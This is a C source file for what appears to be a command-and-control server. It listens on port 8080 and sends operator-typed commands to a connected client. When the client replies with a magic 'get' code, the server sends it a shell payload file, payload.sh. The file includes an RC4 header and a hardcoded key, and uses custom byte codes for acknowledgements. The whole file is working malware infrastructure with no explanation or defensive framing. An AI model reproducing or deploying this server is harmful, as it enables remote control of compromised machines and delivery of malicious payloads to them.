#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <fcntl.h>
#include "rc4.h"

void exfiltrate_payload(int afd);

int afd;
void sigint_handler(int s){
    printf("Received CTRL-C\n");
    send(afd, "\xef\xbe\0", 3, 0);
    close(afd);
    exit(1);
}

// Define the communication directives
#define NET_EXIT 0
#define NET_GET  1

int recv_ack(char *buf){
    if (strcmp(buf, "\xbe\xba") == 0)
        return NET_EXIT;
    if (strcmp(buf, "\xad\xde") == 0)
        return NET_GET;
    return -1;
}

char *key = "LECNAAEAAE";
int main(int argc, char **argv){
    int status;
    struct addrinfo hints;
    struct addrinfo *servinfo;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags    = AI_PASSIVE;

    if ((status = getaddrinfo(NULL, "8080", &hints, &servinfo)) != 0 ) {
        fprintf(stderr, "getaddrinfo error %s\n", gai_strerror(status));
        exit(1);
    }

    int err, soc;
    soc = socket(servinfo->ai_family, servinfo->ai_socktype, servinfo->ai_protocol);
    if (soc == -1) {
        perror("Failed to allocate a socket");
        exit(EXIT_FAILURE);
    }

    int yes=1;
    //char yes='1'; // Solaris people use this

    // lose the pesky "Address already in use" error message
    if (setsockopt(soc, SOL_SOCKET,SO_REUSEADDR,&yes,sizeof yes) == -1) {
        perror("setsockopt");
        exit(1);
    } 


    err = bind(soc, servinfo->ai_addr, servinfo->ai_addrlen);
    if (err == -1) {
        perror("Failed to bind a socket");
        exit(EXIT_FAILURE);
    }

    err = listen(soc, 5);
    if (err == -1) {
        perror("Failed to listen on socket");
        exit(EXIT_FAILURE);
    }

    freeaddrinfo(servinfo);

    struct sigaction sigIntHandler;

    sigIntHandler.sa_handler = sigint_handler;
    sigemptyset(&sigIntHandler.sa_mask);
    sigIntHandler.sa_flags = 0;

    sigaction(SIGINT, &sigIntHandler, NULL);

    char BUF[1024];
    ssize_t recvn;
    // int afd;
    struct sockaddr_storage their_addr;
    socklen_t addrSize = sizeof their_addr;
    while ((afd = accept(soc, (struct sockaddr *)&their_addr, &addrSize)) != -1){
        puts("New client connected");
        while (1){
            printf("> ");
            memset(BUF, 0, 1024);
            scanf("%1023[^\n]", BUF);
            getchar();
            if(strlen(BUF) == 0) continue;

            ssize_t sendn = send(afd, BUF, strlen(BUF), 0);
            if (sendn == -1){
                perror("Failed to send msg");
                exit(EXIT_FAILURE);
            }
            
            recvn = recv(afd, BUF, 1024, 0);
            if (recvn == -1){
                perror("Failed to recv msg");
                exit(EXIT_FAILURE);
            }
            
            printf("ACK: ");
            int i = 0;
            while (BUF[i]) printf("%02x", (unsigned char)BUF[i++]);
            puts("");

            switch (recv_ack(BUF)){
                case NET_EXIT:
                    puts("Client disconnected");
                    break;
                case NET_GET:
                    puts("get haha");
                    exfiltrate_payload(afd);
                    break;

                default:
                    break;
            }

        }
    }
    
    return 0;
}

void exfiltrate_payload(int afd){
    int pldfd = open("payload.sh", O_RDONLY);
    if (pldfd == -1) {
        perror("Failed to open payload file");
        exit(1);
    }

    char BUF[1024];
    memset(BUF, 0, 1024);
    ssize_t readn, sendn;
    while ((readn = read(pldfd, BUF, 1024)) > 0){
        sendn = send(afd, BUF, readn, 0);
        memset(BUF, 0, 1024);
        if (sendn == -1){
            perror("Failed to send payload to client");
            exit(1);
        }
    }
    close(pldfd);
}